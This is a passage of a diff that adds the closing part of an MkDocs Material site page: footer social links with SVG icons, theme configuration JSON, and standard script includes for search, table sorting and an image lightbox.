+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M357.2 48h70.6L273.6 224.2 455 464H313L201.7 318.6 74.5 464H3.8l164.9-188.5L-5.2 48h145.6l100.5 132.9zm-24.8 373.8h39.1L119.1 88h-42z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/tomfieber" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/thomasfieber" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://discord.gg/XvAFFw6A" target="_blank" rel="noopener" title="discord.gg" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M492.5 69.8c-.2-.3-.4-.6-.8-.7-38.1-17.5-78.4-30-119.7-37.1-.4-.1-.8 0-1.1.1s-.6.4-.8.8c-5.5 9.9-10.5 20.2-14.9 30.6-44.6-6.8-89.9-6.8-134.4 0-4.5-10.5-9.5-20.7-15.1-30.6-.2-.3-.5-.6-.8-.8s-.7-.2-1.1-.2C162.5 39 122.2 51.5 84.1 69c-.3.1-.6.4-.8.7C7.1 183.5-13.8 294.6-3.6 404.2c0 .3.1.5.2.8s.3.4.5.6c44.4 32.9 94 58 146.8 74.2.4.1.8.1 1.1 0s.7-.4.9-.7c11.3-15.4 21.4-31.8 30-48.8.1-.2.2-.5.2-.8s0-.5-.1-.8-.2-.5-.4-.6-.4-.3-.7-.4c-15.8-6.1-31.2-13.4-45.9-21.9-.3-.2-.5-.4-.7-.6s-.3-.6-.3-.9 0-.6.2-.9.3-.5.6-.7c3.1-2.3 6.2-4.7 9.1-7.1.3-.2.6-.4.9-.4s.7 0 1 .1c96.2 43.9 200.4 43.9 295.5 0 .3-.1.7-.2 1-.2s.7.2.9.4c2.9 2.4 6 4.9 9.1 7.2.2.2.4.4.6.7s.2.6.2.9-.1.6-.3.9-.4.5-.6.6c-14.7 8.6-30 15.9-45.9 21.8-.2.1-.5.2-.7.4s-.3.4-.4.7-.1.5-.1.8.1.5.2.8c8.8 17 18.8 33.3 30 48.8.2.3.6.6.9.7s.8.1 1.1 0c52.9-16.2 102.6-41.3 147.1-74.2.2-.2.4-.4.5-.6s.2-.5.2-.8c12.3-126.8-20.5-236.9-86.9-334.5zm-302 267.7c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.4 59.2-52.8 59.2m195.4 0c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.2 59.2-52.8 59.2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.instant", "navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "navigation.top", "search.suggestions", "search.highlight", "navigation.footer", "content.code.copy", "content.code.annotate", "content.code.tabs"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.92b07e13.min.js"></script>
+      
+        <script src="https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js"></script>
+      
+        <script src="../../../../javascripts/tablesort.js"></script>
+      
+        <script src="../../../../javascripts/extra.js"></script>
+      
+    
+  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(() => { lightbox.reload() });
+</script></body>
+</html>
